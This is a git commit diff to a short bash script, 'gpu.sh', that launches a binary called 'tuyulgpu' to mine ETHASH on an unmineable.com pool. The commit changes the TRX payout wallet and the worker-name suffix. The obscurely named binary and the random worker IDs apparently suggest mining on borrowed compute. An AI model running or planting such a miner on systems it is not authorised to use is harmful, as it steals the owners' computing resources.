69515b65c8d8a71e4b2a3486bf0b236289196ed1
jambanngamuk <88856530+jambanngamuk@users.noreply.github.com>
2021-08-13 03:13:16 +0700

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TA341dN8GbhAyVfPb9A3Gwxnq3eMSbrcLD
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+WALLET=TRX:THWUtd6uVyNx8ioL4kqa1xffJZAghBgbAk
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-JINGAN)
 
 chmod +x tuyulgpu
 ./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
